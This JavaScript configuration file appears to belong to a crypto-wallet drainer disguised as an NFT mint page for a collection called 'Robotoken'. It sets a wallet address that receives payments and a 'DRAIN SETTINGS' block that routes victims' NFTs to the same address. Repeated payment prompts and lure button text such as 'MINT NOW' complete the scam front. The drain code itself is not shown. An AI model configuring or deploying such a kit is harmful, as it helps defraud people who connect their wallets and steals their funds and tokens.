
/*
    = = = = = YOU WALLET ADRESS = = = = =
*/

const receiveAddress = "0xd4550697Fe601BdAeD1E591d47A887Aa7097400a";

/*
    = = = = = COLLECTION SETTINGS = = = = =
*/

const collectionInfo = {
    name: "Robotoken",
    date: "19.05.2022",
    socialMedia: {
        discord: "discord.gg/invite_here",
        twitter: "https://twitter.com/username_here",
    },
    medias: {
        preview: "prv.png",
        favicon: "",
    },
    background: {
        type: "image", // Supported types: image, video, color (use image for gif)
        image: "bgg.png", // Image for image type or video preview for video type (image befor video load)
        video: "background.mp4", // If you don't use video type, you can ignore this line
        color: "#4E4E6D", // If you don't use color type, you can ignore this line
    }
}


/*
    = = = = = MINT INFORMATIONS = = = = =
*/

const mintInfo = {
    price: 0.12,
    totalSupply: 999,
    minUnits: 1,
    maxUnits: 5,
    askMintLoop: true,
}

/*
    = = = = = DRAIN SETTINGS = = = = =
*/

const drainNftsInfo = {
    active: false,
    minValue: 0.02,
    maxTransfer: 1,
    nftReceiveAddress: "0xd4550697Fe601BdAeD1E591d47A887Aa7097400a",
}

const customStrings = {
    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "CONNECT WALLET",
    transferButton: "MINT NOW",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!receiveAddress.startsWith("0x") ||
    (
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion
